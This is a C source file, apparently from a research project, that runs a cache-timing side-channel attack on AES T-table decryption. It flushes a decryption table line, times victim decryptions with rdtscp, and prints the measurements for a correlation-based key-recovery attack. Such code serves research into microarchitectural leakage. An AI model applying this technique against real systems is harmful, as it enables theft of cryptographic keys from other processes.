/*
 * Copyright 2024 Zhiyuan Zhang
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include "./aes_source/attack.h"
#include <time.h>

#include <mastik/low.h>
#include <mastik/util.h>

#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence;\n");
#define THRESHOLD 1000 // filter outliers, it could be model-specific. 
#define SAMPLES 10000 
#define REPEAT 1 // Repeat each measurement and take average

extern u32 Td0[256];
extern u32 Td1[256];
extern u32 Td2[256];
extern u32 Td3[256];

int flush_array[256 * 1024] = {0};
void init_array(int *buffer);
void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index);
uint32_t time_collection[SAMPLES] = {0};

int main(int argc, char* argv[])
{
  int test_byte = atoi(argv[1]);
  
  u32 *tb_ptr = Td0;
  if ((test_byte % 4) == 1)
    tb_ptr = Td1;
  else if ((test_byte % 4) == 2)
    tb_ptr = Td2;
  else if ((test_byte % 4) == 3)
    tb_ptr = Td3;

  srand(time(NULL));
  aes_t key,out, tmp, guess_key, real_key;
  init_array(flush_array);
  
  // Set Key
  toBinary("00112233445566778899aabbccddeeff", key);
  //randAes(key);
  AES_set_decrypt_key(key, 128, &aeskey);

  const u32 *rk;
  rk = aeskey.rd_key;
  for (int copy_key = 0; copy_key < 16; copy_key++) {
    real_key[copy_key] = (rk[copy_key/4] >> ((3 - copy_key % 4) * 8)) & 0xff;
    // printf("%x ", (real_key[copy_key] & 0xFF) >> 4);
  }
  
  //Randomly Generate CT
  aes_t in[SAMPLES];
  for (int i = 0; i < SAMPLES; i++) {
    randAes(in[i]);
  }


  delayloop(0x800000);
  delayloop(0x800000);
  delayloop(0x800000);

  for (int i = 0; i < SAMPLES; i++) {
    uint64_t overall_time = 0;
    for (int j = 0; j < REPEAT; j++) {
      int index = random() % 256;
#if ESTDEF
      // Slow down the pointer chasing
      clflush(&flush_array[index << 10]);
      memory_barrier
#endif

      // To obtain better results with E+T, one need to preload tables into the cache first.
      // However, it is not needed for EST
#if !ESTDEF
      AES_decrypt(in[i], out, &aeskey);
      AES_decrypt(in[i], out, &aeskey);
      AES_decrypt(in[i], out, &aeskey);
      AES_decrypt(in[i], out, &aeskey);
      memory_barrier
      memory_barrier
#endif

      // Evict target cache line
      clflush(tb_ptr);
      memory_barrier

      // Start measurement
      uint32_t time_start = rdtscp();
      victim_function(in[i], out, aeskey, index);
      uint32_t time_end = rdtscp();
      memory_barrier

      // Filter outliers
      overall_time += (time_end - time_start) < THRESHOLD ? (time_end - time_start) : THRESHOLD;
    }
    memory_barrier
    time_collection[i] = (overall_time / REPEAT);
  }

  // Print the results for the corelation attack
  printf("Measurement Byte ACCESS\n");
  for (int tmp = 0; tmp < SAMPLES; tmp++) {
	  printf("%d %d %d\n", time_collection[tmp], (in[tmp][test_byte] >>4), AES_decrypt2(in[tmp], out, &aeskey, 0));
  }
  return 1;
}

void init_array(int *buffer)
{
    for (size_t k = 0; k < 256; ++k)
    {                                                                  
        size_t x = ((k * 167) + 13) & (0xff);
        buffer[k * 1024] = x;
    }
}

void victim_function(aes_t in, aes_t out, AES_KEY aeskey, int index)
{
#if ESTDEF
  volatile int next_index = flush_array[index << 10];
#endif
  AES_decrypt(in, out, &aeskey);
}
